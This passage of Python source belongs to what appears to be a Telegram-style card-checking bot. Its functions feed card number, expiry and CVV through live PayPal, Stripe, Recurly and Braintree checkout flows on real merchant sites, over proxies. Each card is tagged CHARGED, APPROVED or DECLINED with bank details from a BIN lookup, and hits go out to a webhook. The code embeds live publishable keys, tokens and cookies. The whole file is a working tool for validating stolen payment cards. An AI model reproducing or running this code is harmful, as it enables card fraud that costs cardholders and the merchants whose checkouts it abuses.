     'referer': 'https://www.paypal.com/smart/card-fields?sessionID=uid_95bc507f5d_mtu6ntu6mzq&buttonSessionID=uid_3d53a1a232_mty6mde6mte&locale.x=en_US&commit=true&env=production&sdkMeta=eyJ1cmwiOiJodHRwczovL3d3dy5wYXlwYWwuY29tL3Nkay9qcz9jbGllbnQtaWQ9QVhDTG1fTkRad1dTbENUNzZjSkpmSTB4Z29mRmJsc192TXpxMkVSNnU2WndHYktaXzc2Y2pOU2FkMHlLclJNRTdrOE5fU19lLUVfcC10NjkmY3VycmVuY3k9VVNEJmludGVncmF0aW9uLWRhdGU9MjAyNC0wMy0xMiZjb21wb25lbnRzPWJ1dHRvbnMsZnVuZGluZy1lbGlnaWJpbGl0eSxtZXNzYWdlcyZ2YXVsdD1mYWxzZSZjb21taXQ9dHJ1ZSZpbnRlbnQ9Y2FwdHVyZSZlbmFibGUtZnVuZGluZz12ZW5tbyxwYXlsYXRlciIsImF0dHJzIjp7ImRhdGEtcGFydG5lci1hdHRyaWJ1dGlvbi1pZCI6Ildvb19QUENQIiwiZGF0YS11aWQiOiJ1aWRfZnRmdHdjZGxubnpydWtjdWNvZm5mamVneGJxa256In19&disable-card=&token=1KE0784473579371R',
     'sec-ch-ua': '"Chromium";v="122", "Not(A:Brand";v="24", "Google Chrome";v="122"',
     'sec-ch-ua-mobile': '?0',
     'sec-ch-ua-platform': '"Windows"',
     'sec-fetch-dest': 'empty',
     'sec-fetch-mode': 'cors',
     'sec-fetch-site': 'same-origin',
     'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
     'x-app-name': 'standardcardfields',
     'x-country': 'US',
    }

    json_data = {
        'query': '\n        mutation payWithCard(\n            $token: String!\n            $card: CardInput!\n            $phoneNumber: String\n            $firstName: String\n            $lastName: String\n            $shippingAddress: AddressInput\n            $billingAddress: AddressInput\n            $email: String\n            $currencyConversionType: CheckoutCurrencyConversionType\n            $installmentTerm: Int\n        ) {\n            approveGuestPaymentWithCreditCard(\n                token: $token\n                card: $card\n                phoneNumber: $phoneNumber\n                firstName: $firstName\n                lastName: $lastName\n                email: $email\n                shippingAddress: $shippingAddress\n                billingAddress: $billingAddress\n                currencyConversionType: $currencyConversionType\n                installmentTerm: $installmentTerm\n            ) {\n                flags {\n                    is3DSecureRequired\n                }\n                cart {\n                    intent\n                    cartId\n                    buyer {\n                        userId\n                        auth {\n                            accessToken\n                        }\n                    }\n                    returnUrl {\n                        href\n                    }\n                }\n                paymentContingencies {\n                    threeDomainSecure {\n                        status\n                        method\n                        redirectUrl {\n                            href\n                        }\n                        parameter\n                    }\n                }\n            }\n        }\n        ',
        'variables': {
            'token': orderid,
            'card': {
                'cardNumber': cc,
                'expirationDate': mes + "/" + ano,
                'postalCode': '99611',
                'securityCode': cvv,
            },
            'firstName': 'techno',
            'lastName': 'tinker',
            'billingAddress': {
                'givenName': 'techno',
                'familyName': 'tinker',
                'line1': '3448 Ile De France St #242',
                'line2': None,
                'city': 'Fort Wainwright',
                'state': 'AK',
                'postalCode': '99611',
                'country': 'US',
            },
            'email': 'technotinker2020@gmail.com',
            'currencyConversionType': 'PAYPAL',

        },
        'operationName': None,
    }

    response = r.post(
     'https://www.paypal.com/graphql?fetch_credit_form_submit',
     headers=headers4,
     json=json_data,
     proxies=proxies,
    )

    print(response.text)
    msg = find_between(response.text, '"code":"', '"')
    print(msg)

    first6 = cc[:6]

    response = r.get(f"https://bins.antipublic.cc/bins/{first6}", headers=headers, proxies=proxies)
    data = json.loads(response.text)

    binn = data["bin"]
    brand = data["brand"]
    country = data["country"]
    bank = data["bank"]
    level = data["level"]
    card_type = data["type"]
    flag = data["country_flag"]
    currencies2 = ', '.join(data["country_currencies"])

    if "EXISTING_ACCOUNT_RESTRICTED" in msg:

        return f"✫PAYPAL AUTH✫ \n---------------------------------\n➥ 𝗖𝗖: `{cc}|{mes}|{ano}|{cvv}`\n➥ 𝗥𝗘𝗦𝗣𝗢𝗡𝗦𝗘: `{msg}`\n➥ 𝗦𝗧𝗔𝗧𝗨𝗦: `APPROVED 🟢`\n---------------------------------\n𝗕𝗜𝗡: {binn} - {brand} - {card_type} - {level}\n𝗕𝗮𝗻𝗸: {bank} 🏛\n𝗖𝗢𝗨𝗡𝗧𝗥𝗬: {country} - {flag} - {currencies2}\n---------------------------------\nBOT BY ⍟ : @LakshayFR"
    if "INVALID_SECURITY_CODE" in msg:

        return f"✫PAYPAL AUTH✫ \n---------------------------------\n➥ 𝗖𝗖: `{cc}|{mes}|{ano}|{cvv}`\n➥ 𝗥𝗘𝗦𝗣𝗢𝗡𝗦𝗘: `{msg}`\n➥ 𝗦𝗧𝗔𝗧𝗨𝗦: `CCN APPROVED 🟢`\n---------------------------------\n𝗕𝗜𝗡: {binn} - {brand} - {card_type} - {level}\n𝗕𝗮𝗻𝗸: {bank} 🏛\n𝗖𝗢𝗨𝗡𝗧𝗥𝗬: {country} - {flag} - {currencies2}\n---------------------------------\nBOT BY ⍟ : @LakshayFR"
    if "BILLING" in msg:

        return f"✫PAYPAL AUTH✫ \n---------------------------------\n➥ 𝗖𝗖: `{cc}|{mes}|{ano}|{cvv}`\n➥ 𝗥𝗘𝗦𝗣𝗢𝗡𝗦𝗘: `{msg}`\n➥ 𝗦𝗧𝗔𝗧𝗨𝗦: `APPROVED 🟢`\n---------------------------------\n𝗕𝗜𝗡: {binn} - {brand} - {card_type} - {level}\n𝗕𝗮𝗻𝗸: {bank} 🏛\n𝗖𝗢𝗨𝗡𝗧𝗥𝗬: {country} - {flag} - {currencies2}\n---------------------------------\nBOT BY ⍟ : @LakshayFR"
    elif "Your card does not support this type of purchase." in msg:

        return f"✫PAYPAL AUTH✫ \n---------------------------------\n➥ 𝗖𝗖: `{cc}|{mes}|{ano}|{cvv}`\n➥ 𝗥𝗘𝗦𝗣𝗢𝗡𝗦𝗘: `{msg}`\n➥ 𝗦𝗧𝗔𝗧𝗨𝗦: `APPROVED 🟢`\n---------------------------------\n𝗕𝗜𝗡: {binn} - {brand} - {card_type} - {level}\n𝗕𝗮𝗻𝗸: {bank} 🏛\n𝗖𝗢𝗨𝗡𝗧𝗥𝗬: {country} - {flag} - {currencies2}\n---------------------------------\nBOT BY ⍟ : @LakshayFR"
    elif "Your card has insufficient funds." in msg:

        return f"✫PAYPAL AUTH✫ \n---------------------------------\n➥ 𝗖𝗖: `{cc}|{mes}|{ano}|{cvv}`\n➥ 𝗥𝗘𝗦𝗣𝗢𝗡𝗦𝗘: `{msg}`\n➥ 𝗦𝗧𝗔𝗧𝗨𝗦: `APPROVED 🟢`\n---------------------------------\n𝗕𝗜𝗡: {binn} - {brand} - {card_type} - {level}\n𝗕𝗮𝗻𝗸: {bank} 🏛\n𝗖𝗢𝗨𝗡𝗧𝗥𝗬: {country} - {flag} - {currencies2}\n---------------------------------\nBOT BY ⍟ : @LakshayFR"
    else:
        return f"✫PAYPAL AUTH✫ \n---------------------------------\n➥ 𝗖𝗖: `{cc}|{mes}|{ano}|{cvv}`\n➥ 𝗥𝗘𝗦𝗣𝗢𝗡𝗦𝗘: `{msg}`\n➥ 𝗦𝗧𝗔𝗧𝗨𝗦: `DECLINED 🔴`\n---------------------------------\n𝗕𝗜𝗡: {binn} - {brand} - {card_type} - {level}\n𝗕𝗮𝗻𝗸: {bank} 🏛\n𝗖𝗢𝗨𝗡𝗧𝗥𝗬: {country} - {flag} - {currencies2}\n---------------------------------\nBOT BY ⍟ : @LakshayFR"

def check_gateway(url):
    try:
        headers = {'User-Agent': get_random_user_agent()}
        response = requests.get(url, headers=headers, timeout=5)
        response.raise_for_status()
    except requests.RequestException as e:
        return None, f"Error accessing {url}: {e}"

    bsoup = BeautifulSoup(response.text, 'html.parser')

    payment_gateways = {
        'stripe': re.compile(r'.*js\.stripe\.com.*|.*stripe.*'),
        'paypal': re.compile(r'.*paypal.*|.*checkout\.paypal\.com.*|.*paypalobjects.*'),
        'braintree': re.compile(r'.*braintree.*|.*braintreegateway.*'),
        'worldpay': re.compile(r'.*worldpay.*'),
        'authnet': re.compile(r'.*authorizenet.*|.*authorize\.net.*'),
        'recurly': re.compile(r'.*recurly.*'),
        'shopify': re.compile(r'.*shopify.*'),
        'square': re.compile(r'.*square.*'),
        'cybersource': re.compile(r'.*cybersource.*'),
        'adyen': re.compile(r'.*adyen.*'),
        '2checkout': re.compile(r'.*2checkout.*'),
        'authorize.net': re.compile(r'.*authorize\.net.*'),
        'eworldpay': re.compile(r'.*worldpay.*'),
        'eway': re.compile(r'.*eway.*'),
        'bluepay': re.compile(r'.*bluepay.*'),
        'google_captcha': re.compile(r'.*www\.google\.com/recaptcha.*|.*recaptcha/api\.js.*'),
        'cloudflare_captcha': re.compile(r'.*cloudflare\.com/cdn-cgi/scripts/captcha.*')
    }

    detected_gateway = []

    for pg, pattern in payment_gateways.items():
        script_elements = bsoup.find_all('script', {'src': pattern})
        if bsoup.find(string=re.compile(rf'.*{pg}.*', re.IGNORECASE)) or script_elements:
            detected_gateway.append(pg)

    return url, detected_gateway, None

def stripe3(cc, mes, ano, cvv):
    r = requests.Session()

    headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36",
    "Pragma": "no-cache",
    "Accept": "*/*"
}
    data = {
    "_method": "POST",
    "data[_Token][key]": "b34c7e55415175cfde640584619a958981df40c816ce4ccdb071382f041e0aaab35ad8c669a52e3db81d74f80b8bbc407b364b8e72be21693b19c8f848666b15",
    "data[Payment][description]": "Other",
    "data[Payment][amount]": "1",
    "data[Payment][property_reference]": "ad",
    "data[Payment][name]": "james smith",
    "data[Payment][email]": "amphanjaiya.25.0.819.65@gmail.com",
    "data[_Token][fields]": "8bc585fd9e3b17d1c51f647aa49262a115607251%253A",
    "data[_Token][unlocked]": "Payment.description"
}

    response = r.post("https://mandeville-pm.co.uk/make-a-payment/generate", headers=headers, data=data, proxies=proxies)

    short = response.json()["id"]
    pi = response.json()["client_secret"]

    url = f"https://api.stripe.com/v1/payment_intents/{short}/confirm"
    headers2 = {
    "Content-Type": "application/x-www-form-urlencoded"
}
    data2 = {
    "payment_method_data[type]": "card",
    "payment_method_data[billing_details][address][postal_code]": "90084",
    "payment_method_data[card][number]": cc,
    "payment_method_data[card][cvc]": cvv,
    "payment_method_data[card][exp_month]": mes,
    "payment_method_data[card][exp_year]": ano,
    "payment_method_data[guid]": "762e6668-3a8f-49ed-8f5e-0820ec7fc25cc38b9a",
    "payment_method_data[muid]": "cdd6e35e-257f-4a14-84bb-2d76a0dcabf4318a30",
    "payment_method_data[sid]": "b86f1074-761e-4de7-b989-b34845d1e7fe2451d1",
    "payment_method_data[pasted_fields]": "number",
    "payment_method_data[payment_user_agent]": "stripe.js/cd4fc6eb02; stripe-js-v3/cd4fc6eb02",
    "payment_method_data[time_on_page]": "337064",
    "expected_payment_method_type": "card",
    "use_stripe_sdk": "true",
    "key": "pk_live_51GvfcIHPPe15fBoC8T8Oi6nHDTEU1DuMKBM9LyQ6buVsqbH7m3IsYIGDxySh1afhUymBEa8UdOiSlLitZuvqDQrZ00aKM8TnVy",
    "client_secret": pi
}

    response = r.post(url=url, headers=headers2, data=data2, proxies=proxies)
    print(response.text)
    msg = find_between(response.text, '"message": "', '",')
    code = find_between(response.text, '"decline_code": "', '",')
    print(msg,code)

    first6 = cc[:6]

    response = r.get(f"https://bins.antipublic.cc/bins/{first6}", headers=headers, proxies=proxies)
    data = json.loads(response.text)

    binn = data["bin"]
    brand = data["brand"]
    country = data["country"]
    bank = data["bank"]
    level = data["level"]
    card_type = data["type"]
    flag = data["country_flag"]
    currencies2 = ', '.join(data["country_currencies"])

    if '"status": "succeeded"' in response.text:
        payload = {
                "content": f"✫ 𝗦𝗧𝗥𝗜𝗣𝗘 𝟭$ ✫ \n---------------------------------\n➥ 𝗖𝗖: `{cc}|{mes}|{ano}|{cvv}`\n➥ 𝗥𝗘𝗦𝗣𝗢𝗡𝗦𝗘: Payment Succeeded\n➥ 𝗦𝗧𝗔𝗧𝗨𝗦: `CHARGED 🟢`\n---------------------------------\n𝗕𝗜𝗡: {binn} - {brand} - {card_type} - {level}\n𝗕𝗮𝗻𝗸: {bank} 🏛\n𝗖𝗢𝗨𝗡𝗧𝗥𝗬: {country} - {flag} - {currencies2}\n---------------------------------\nBOT BY ⍟ : @LakshayFR"
        }
        send_hook(payload)
        return f"✫ 𝗦𝗧𝗥𝗜𝗣𝗘 𝟭$ ✫ \n---------------------------------\n➥ 𝗖𝗖: `{cc}|{mes}|{ano}|{cvv}`\n➥ 𝗥𝗘𝗦𝗣𝗢𝗡𝗦𝗘: Payment Succeeded\n➥ 𝗦𝗧𝗔𝗧𝗨𝗦: `CHARGED 🟢`\n---------------------------------\n𝗕𝗜𝗡: {binn} - {brand} - {card_type} - {level}\n𝗕𝗮𝗻𝗸: {bank} 🏛\n𝗖𝗢𝗨𝗡𝗧𝗥𝗬: {country} - {flag} - {currencies2}\n---------------------------------\nBOT BY ⍟ : @LakshayFR"
    elif "stripe_3ds2_fingerprint" in response.text:
        payload = {
            "content": f"✫ 𝗦𝗧𝗥𝗜𝗣𝗘 𝟭$ ✫ \n---------------------------------\n➥ 𝗖𝗖: `{cc}|{mes}|{ano}|{cvv}`\n➥ 𝗥𝗘𝗦𝗣𝗢𝗡𝗦𝗘: 3DS ENABLED\n➥ 𝗦𝗧𝗔𝗧𝗨𝗦: `APPROVED CVV 🟢`\n---------------------------------\n𝗕𝗜𝗡: {binn} - {brand} - {card_type} - {level}\n𝗕𝗮𝗻𝗸: {bank} 🏛\n𝗖𝗢𝗨𝗡𝗧𝗥𝗬: {country} - {flag} - {currencies2}\n---------------------------------\nBOT BY ⍟ : @LakshayFR"
        }
        send_hook(payload)
        return f"✫ 𝗦𝗧𝗥𝗜𝗣𝗘 𝟭$ ✫ \n---------------------------------\n➥ 𝗖𝗖: `{cc}|{mes}|{ano}|{cvv}`\n➥ 𝗥𝗘𝗦𝗣𝗢𝗡𝗦𝗘: 3DS ENABLED\n➥ 𝗦𝗧𝗔𝗧𝗨𝗦: `APPROVED CVV 🟢`\n---------------------------------\n𝗕𝗜𝗡: {binn} - {brand} - {card_type} - {level}\n𝗕𝗮𝗻𝗸: {bank} 🏛\n𝗖𝗢𝗨𝗡𝗧𝗥𝗬: {country} - {flag} - {currencies2}\n---------------------------------\nBOT BY ⍟ : @LakshayFR"
    elif "Your card's security code is incorrect." in response.text:
        payload = {
            "content": f"✫ 𝗦𝗧𝗥𝗜𝗣𝗘 𝟭$ ✫ \n---------------------------------\n➥ 𝗖𝗖: `{cc}|{mes}|{ano}|{cvv}`\n➥ 𝗥𝗘𝗦𝗣𝗢𝗡𝗦𝗘: `{msg}`\n➥ 𝗦𝗧𝗔𝗧𝗨𝗦: `CCN APPROVED 🟢`\n---------------------------------\n𝗕𝗜𝗡: {binn} - {brand} - {card_type} - {level}\n𝗕𝗮𝗻𝗸: {bank} 🏛\n𝗖𝗢𝗨𝗡𝗧𝗥𝗬: {country} - {flag} - {currencies2}\n---------------------------------\nBOT BY ⍟ : @LakshayFR"
        }
        send_hook(payload)
        return f"✫ 𝗦𝗧𝗥𝗜𝗣𝗘 𝟭$ ✫ \n---------------------------------\n➥ 𝗖𝗖: `{cc}|{mes}|{ano}|{cvv}`\n➥ 𝗥𝗘𝗦𝗣𝗢𝗡𝗦𝗘: `{msg}`\n➥ 𝗦𝗧𝗔𝗧𝗨𝗦: `CCN APPROVED 🟢`\n---------------------------------\n𝗕𝗜𝗡: {binn} - {brand} - {card_type} - {level}\n𝗕𝗮𝗻𝗸: {bank} 🏛\n𝗖𝗢𝗨𝗡𝗧𝗥𝗬: {country} - {flag} - {currencies2}\n---------------------------------\nBOT BY ⍟ : @LakshayFR"
    elif "Your card's security code is invalid" in response.text:
        payload = {
            "content": f"✫ 𝗦𝗧𝗥𝗜𝗣𝗘 𝟭$ ✫ \n---------------------------------\n➥ 𝗖𝗖: `{cc}|{mes}|{ano}|{cvv}`\n➥ 𝗥𝗘𝗦𝗣𝗢𝗡𝗦𝗘: `{msg}`\n➥ 𝗦𝗧𝗔𝗧𝗨𝗦: `CCN APPROVED 🟢`\n---------------------------------\n𝗕𝗜𝗡: {binn} - {brand} - {card_type} - {level}\n𝗕𝗮𝗻𝗸: {bank} 🏛\n𝗖𝗢𝗨𝗡𝗧𝗥𝗬: {country} - {flag} - {currencies2}\n---------------------------------\nBOT BY ⍟ : @LakshayFR"
        }
        send_hook(payload)
        return f"✫ 𝗦𝗧𝗥𝗜𝗣𝗘 𝟭$ ✫ \n---------------------------------\n➥ 𝗖𝗖: `{cc}|{mes}|{ano}|{cvv}`\n➥ 𝗥𝗘𝗦𝗣𝗢𝗡𝗦𝗘: `{msg}`\n➥ 𝗦𝗧𝗔𝗧𝗨𝗦: `CCN APPROVED 🟢`\n---------------------------------\n𝗕𝗜𝗡: {binn} - {brand} - {card_type} - {level}\n𝗕𝗮𝗻𝗸: {bank} 🏛\n𝗖𝗢𝗨𝗡𝗧𝗥𝗬: {country} - {flag} - {currencies2}\n---------------------------------\nBOT BY ⍟ : @LakshayFR"
    elif "Your card does not support this type of purchase." in msg:
        payload = {
            "content": f"✫ 𝗦𝗧𝗥𝗜𝗣𝗘 𝟭$ ✫ \n---------------------------------\n➥ 𝗖𝗖: `{cc}|{mes}|{ano}|{cvv}`\n➥ 𝗥𝗘𝗦𝗣𝗢𝗡𝗦𝗘: `{msg}`\n➥ 𝗦𝗧𝗔𝗧𝗨𝗦: `APPROVED 🟢`\n---------------------------------\n𝗕𝗜𝗡: {binn} - {brand} - {card_type} - {level}\n𝗕𝗮𝗻𝗸: {bank} 🏛\n𝗖𝗢𝗨𝗡𝗧𝗥𝗬: {country} - {flag} - {currencies2}\n---------------------------------\nBOT BY ⍟ : @LakshayFR"
        }
        send_hook(payload)
        return f"✫ 𝗦𝗧𝗥𝗜𝗣𝗘 𝟭$ ✫ \n---------------------------------\n➥ 𝗖𝗖: `{cc}|{mes}|{ano}|{cvv}`\n➥ 𝗥𝗘𝗦𝗣𝗢𝗡𝗦𝗘: `{msg}`\n➥ 𝗦𝗧𝗔𝗧𝗨𝗦: `APPROVED 🟢`\n---------------------------------\n𝗕𝗜𝗡: {binn} - {brand} - {card_type} - {level}\n𝗕𝗮𝗻𝗸: {bank} 🏛\n𝗖𝗢𝗨𝗡𝗧𝗥𝗬: {country} - {flag} - {currencies2}\n---------------------------------\nBOT BY ⍟ : @LakshayFR"
    elif "Your card has insufficient funds." in msg:
        payload = {
            "content": f"✫ 𝗦𝗧𝗥𝗜𝗣𝗘 𝟭$ ✫ \n---------------------------------\n➥ 𝗖𝗖: `{cc}|{mes}|{ano}|{cvv}`\n➥ 𝗥𝗘𝗦𝗣𝗢𝗡𝗦𝗘: `{msg}`\n➥ 𝗦𝗧𝗔𝗧𝗨𝗦: `APPROVED 🟢`\n---------------------------------\n𝗕𝗜𝗡: {binn} - {brand} - {card_type} - {level}\n𝗕𝗮𝗻𝗸: {bank} 🏛\n𝗖𝗢𝗨𝗡𝗧𝗥𝗬: {country} - {flag} - {currencies2}\n---------------------------------\nBOT BY ⍟ : @LakshayFR"
        }
        send_hook(payload)
        return f"✫ 𝗦𝗧𝗥𝗜𝗣𝗘 𝟭$ ✫ \n---------------------------------\n➥ 𝗖𝗖: `{cc}|{mes}|{ano}|{cvv}`\n➥ 𝗥𝗘𝗦𝗣𝗢𝗡𝗦𝗘: `{msg}`\n➥ 𝗦𝗧𝗔𝗧𝗨𝗦: `APPROVED 🟢`\n---------------------------------\n𝗕𝗜𝗡: {binn} - {brand} - {card_type} - {level}\n𝗕𝗮𝗻𝗸: {bank} 🏛\n𝗖𝗢𝗨𝗡𝗧𝗥𝗬: {country} - {flag} - {currencies2}\n---------------------------------\nBOT BY ⍟ : @LakshayFR"
    else:
        return f"✫ 𝗦𝗧𝗥𝗜𝗣𝗘 𝟭$ ✫ \n---------------------------------\n➥ 𝗖𝗖: `{cc}|{mes}|{ano}|{cvv}`\n➥ 𝗥𝗘𝗦𝗣𝗢𝗡𝗦𝗘: `{msg}`\n➥ 𝗦𝗧𝗔𝗧𝗨𝗦: `DECLINED 🔴`\n---------------------------------\n𝗕𝗜𝗡: {binn} - {brand} - {card_type} - {level}\n𝗕𝗮𝗻𝗸: {bank} 🏛\n𝗖𝗢𝗨𝗡𝗧𝗥𝗬: {country} - {flag} - {currencies2}\n---------------------------------\nBOT BY ⍟ : @LakshayFR"

def recurly(cc, mes, ano, cvv):
    session = requests.Session()
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36",
        "Pragma": "no-cache",
        "Accept": "*/*",
        "Content-Type": "application/x-www-form-urlencoded"
    }

    payload = {
        "first_name": "tec",
        "last_name": "tink",
        "token": "",
        "number": cc,
        "browser[color_depth]": "24",
        "browser[java_enabled]": "false",
        "browser[language]": "en-US",
        "browser[referrer_url]": "https://www.pathsocial.com/es/getstarted/?plan=expert-annual",
        "browser[screen_height]": "768",
        "browser[screen_width]": "1366",
        "browser[time_zone_offset]": "-330",
        "browser[user_agent]": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
        "month": mes,
        "year": ano,
        "cvv": cvv,
        "version": "4.22.2",
        "key": "ewr1-pyjqdzh3pcXBqIkhwFu40V",
        "deviceId": "n384QCKr8KWUYrLY",
        "sessionId": "iZH0UhyLDCg4ipx1",
        "instanceId": "EoEgyclRrq0MJTML"
    }

    response = session.post("https://api.recurly.com/js/v1/token", data=payload, headers=headers, proxies=proxies)

    print(response.text)

    data = json.loads(response.text)
    id = data["id"]

    payload = f"""pathso_ig_username=tinkertechno&user_email=technotinker2020%40gmail.com&recurly-token={id}&recurly-token-3D=&recurly-coupon-code=&user_handle_current_followers=&promo_code=&action=recurly_sub_payment&decline_pay_status=no&plan=expert-annual&last_name=tink&first_name=tec&ig_username=tinkertechno&browser_info=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36&user_currency=INR&user_country=IN&user_continent=AS&user_lang=es&pass_twenty_percent_coupon=no&plan_source=&add_like_blast_addon=no&add_engagement_view_addon=no&add_story_view_addon=yes&pp_key_count=9&fingerprint=0e8b0515f535c315e870839c14a51b07&event_source_url=https://www.pathsocial.com/es/getstarted/?plan=expert-annual&utm_source_cookie=&utm_medium_cookie=&utm_campaign_cookie=&utm_term_cookie=&utm_content_cookie=&addon_type=annual"""

    r2 = session.post("https://www.pathsocial.com/wp-admin/admin-ajax.php", data=payload, headers=headers, proxies=proxies)

    print(r2.text)
    msg = find_between(r2.text, '"error_code":"', '"')
    msg2 = find_between(r2.text, '"status":"', '"')
    print(msg)
    print(msg2)

    first6 = cc[:6]

    response = session.get(f"https://bins.antipublic.cc/bins/{first6}", headers=headers, proxies=proxies)
    data = json.loads(response.text)

    binn = data["bin"]
    brand = data["brand"]
    country = data["country"]
    bank = data["bank"]
    level = data["level"]
    card_type = data["type"]
    flag = data["country_flag"]
    currencies2 = ', '.join(data["country_currencies"])

    if "success" in msg2:

        return f"✫RECURLY✫ \n---------------------------------\n➥ 𝗖𝗖: `{cc}|{mes}|{ano}|{cvv}`\n➥ 𝗥𝗘𝗦𝗣𝗢𝗡𝗦𝗘: `{msg2}`\n➥ 𝗦𝗧𝗔𝗧𝗨𝗦: `CHARGED 🟢`\n---------------------------------\n𝗕𝗜𝗡: {binn} - {brand} - {card_type} - {level}\n𝗕𝗮𝗻𝗸: {bank} 🏛\n𝗖𝗢𝗨𝗡𝗧𝗥𝗬: {country} - {flag} - {currencies2}\n---------------------------------\nBOT BY ⍟ : @LakshayFR"
    if "fraud_security_code" in msg:

        return f"✫RECURLY✫ \n---------------------------------\n➥ 𝗖𝗖: `{cc}|{mes}|{ano}|{cvv}`\n➥ 𝗥𝗘𝗦𝗣𝗢𝗡𝗦𝗘: `{msg}`\n➥ 𝗦𝗧𝗔𝗧𝗨𝗦: `CCN APPROVED 🟢`\n---------------------------------\n𝗕𝗜𝗡: {binn} - {brand} - {card_type} - {level}\n𝗕𝗮𝗻𝗸: {bank} 🏛\n𝗖𝗢𝗨𝗡𝗧𝗥𝗬: {country} - {flag} - {currencies2}\n---------------------------------\nBOT BY ⍟ : @LakshayFR"
    elif "declined" in msg:
        return f"✫RECURLY✫ \n---------------------------------\n➥ 𝗖𝗖: `{cc}|{mes}|{ano}|{cvv}`\n➥ 𝗥𝗘𝗦𝗣𝗢𝗡𝗦𝗘: `{msg}`\n➥ 𝗦𝗧𝗔𝗧𝗨𝗦: `DECLINED 🔴`\n---------------------------------\n𝗕𝗜𝗡: {binn} - {brand} - {card_type} - {level}\n𝗕𝗮𝗻𝗸: {bank} 🏛\n𝗖𝗢𝗨𝗡𝗧𝗥𝗬: {country} - {flag} - {currencies2}\n---------------------------------\nBOT BY ⍟ : @LakshayFR"
    elif "fraud_gateway" in msg:
        return f"✫RECURLY✫ \n---------------------------------\n➥ 𝗖𝗖: `{cc}|{mes}|{ano}|{cvv}`\n➥ 𝗥𝗘𝗦𝗣𝗢𝗡𝗦𝗘: `{msg}`\n➥ 𝗦𝗧𝗔𝗧𝗨𝗦: `DECLINED 🔴`\n---------------------------------\n𝗕𝗜𝗡: {binn} - {brand} - {card_type} - {level}\n𝗕𝗮𝗻𝗸: {bank} 🏛\n𝗖𝗢𝗨𝗡𝗧𝗥𝗬: {country} - {flag} - {currencies2}\n---------------------------------\nBOT BY ⍟ : @LakshayFR"
    elif "three_d_secure_action_required" in msg:

        return f"✫RECURLY✫ \n---------------------------------\n➥ 𝗖𝗖: `{cc}|{mes}|{ano}|{cvv}`\n➥ 𝗥𝗘𝗦𝗣𝗢𝗡𝗦𝗘: 3DS ENABLED\n➥ 𝗦𝗧𝗔𝗧𝗨𝗦: `APPROVED CVV 🟢`\n---------------------------------\n𝗕𝗜𝗡: {binn} - {brand} - {card_type} - {level}\n𝗕𝗮𝗻𝗸: {bank} 🏛\n𝗖𝗢𝗨𝗡𝗧𝗥𝗬: {country} - {flag} - {currencies2}\n---------------------------------\nBOT BY ⍟ : @LakshayFR"
    else:
        return f"✫RECURLY✫ \n---------------------------------\n➥ 𝗖𝗖: `{cc}|{mes}|{ano}|{cvv}`\n➥ 𝗥𝗘𝗦𝗣𝗢𝗡𝗦𝗘: `{msg}`\n➥ 𝗦𝗧𝗔𝗧𝗨𝗦: `DECLINED 🔴`\n---------------------------------\n𝗕𝗜𝗡: {binn} - {brand} - {card_type} - {level}\n𝗕𝗮𝗻𝗸: {bank} 🏛\n𝗖𝗢𝗨𝗡𝗧𝗥𝗬: {country} - {flag} - {currencies2}\n---------------------------------\nBOT BY ⍟ : @LakshayFR"

def b3(cc, mes, ano, cvv):
    r = requests.Session()

    headers = {
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-US,en;q=0.9',
    'cache-control': 'max-age=0',
    'content-type': 'application/x-www-form-urlencoded',
    # 'cookie': 'zabUserId=1713432912006zabu0.5917773951341629; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-04-18%2009%3A05%3A12%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.weddingtropics.com%2Fmy-account%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fweb.telegram.org%2F; sbjs_first_add=fd%3D2024-04-18%2009%3A05%3A12%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.weddingtropics.com%2Fmy-account%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fweb.telegram.org%2F; sbjs_current=typ%3Dreferral%7C%7C%7Csrc%3Dweb.telegram.org%7C%7C%7Cmdm%3Dreferral%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%2F%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29; sbjs_first=typ%3Dreferral%7C%7C%7Csrc%3Dweb.telegram.org%7C%7C%7Cmdm%3Dreferral%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%2F%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F123.0.0.0%20Safari%2F537.36; zsc9f1c86e1909f411f969988853b26c93d=1713432912977zsc0.742713611512938; zft-sdc=isef%3Dtrue-isfr%3Dtrue-src%3Dweb.telegram.org; _gcl_au=1.1.1779829662.1713432913; _ga=GA1.1.22376554.1713432913; _jsuid=3615473570; _referrer_og=https%3A%2F%2Fweb.telegram.org%2F; FPID=FPID2.2.wMBB0sgMfXZ0gkvFi4VEAxSw6sbtR3sJ6uKVOuCsSbk%3D.1713432913; FPLC=lOi3wxg3KH6LC0GSEyiJPhAcKvNSrO5aj%2FzjrJYPtLSWUzWE8dyqpUXGKEAFUbSzNEqi6oKps1ZAKpeprNXsKdO13NB3IHsQmlvM0Q1WksImiyBq5rUTKbaq2MkvqQ%3D%3D; FPAU=1.1.1779829662.1713432913; _fbp=fb.1.1713432899552.1266071179; zsrqTIfHK9=1713432915439zsrv0.8595092868660772; _custom_data_username=technotinker2020; 